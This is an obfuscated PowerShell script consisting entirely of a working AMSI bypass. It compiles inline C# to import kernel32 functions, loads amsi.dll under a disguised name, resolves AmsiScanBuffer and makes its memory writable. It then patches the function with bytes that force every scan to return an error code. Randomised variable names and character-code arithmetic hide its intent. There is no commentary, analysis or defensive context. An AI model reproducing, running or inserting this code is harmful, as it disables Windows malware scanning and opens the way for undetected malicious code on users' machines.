$xV_3VwVQuuKBR2Xj = @"
using System;
using System.Runtime.InteropServices;
public class xV_3VwVQuuKBR2Xj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr eFGEvbYN_x, string V00irTDUCm4SJ5aPen9);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr nUz, UIntPtr YCpEFaAHFtTbX, uint jqg, out uint J8WnS);
}
"@

Add-Type $xV_3VwVQuuKBR2Xj

$iZK9_eY6SiRgYCZRZ = [xV_3VwVQuuKBR2Xj]::LoadLibrary("$(('ámsî.'+'dll').noRMaLize([cHAr]([BYtE]0x46)+[chAR](111)+[chaR](114*12/12)+[CHAR](109)+[CHaR](68)) -replace [CHAR](92)+[chaR](112*98/98)+[CHAr](123+118-118)+[char](10+67)+[Char]([BYTe]0x6e)+[ChAR]([BYte]0x7d))")
$iIIIEovDrw_Nv = [xV_3VwVQuuKBR2Xj]::GetProcAddress($iZK9_eY6SiRgYCZRZ, "$([chAr](65+40-40)+[ChaR](73+36)+[cHar]([bYTe]0x73)+[chaR]([bYtE]0x69)+[char]([bYTe]0x53)+[chaR]([bYTE]0x63)+[chaR]([ByTe]0x61)+[CHAR]([BytE]0x6e)+[CHAR](66+47-47)+[chAR](117+19-19)+[ChaR]([BYTE]0x66)+[cHAr](102*54/54)+[chAr]([bytE]0x65)+[chAr](114*58/58))")
$p = 0
[xV_3VwVQuuKBR2Xj]::VirtualProtect($iIIIEovDrw_Nv, [uint32]5, 0x40, [ref]$p)
$fgXnMovPlFyAk8d = "0xB8"
$VD5uIJbnKWFWwtG9nGHM = "0x57"
$Bds = "0x00"
$yFK = "0x07"
$AbFTBpvk = "0x80"
$zQL1laFwva1kHc3 = "0xC3"
$FmwMDOuesxn0Z5L = [Byte[]] ($fgXnMovPlFyAk8d,$VD5uIJbnKWFWwtG9nGHM,$Bds,$yFK,+$AbFTBpvk,+$zQL1laFwva1kHc3)
[System.Runtime.InteropServices.Marshal]::Copy($FmwMDOuesxn0Z5L, 0, $iIIIEovDrw_Nv, 6)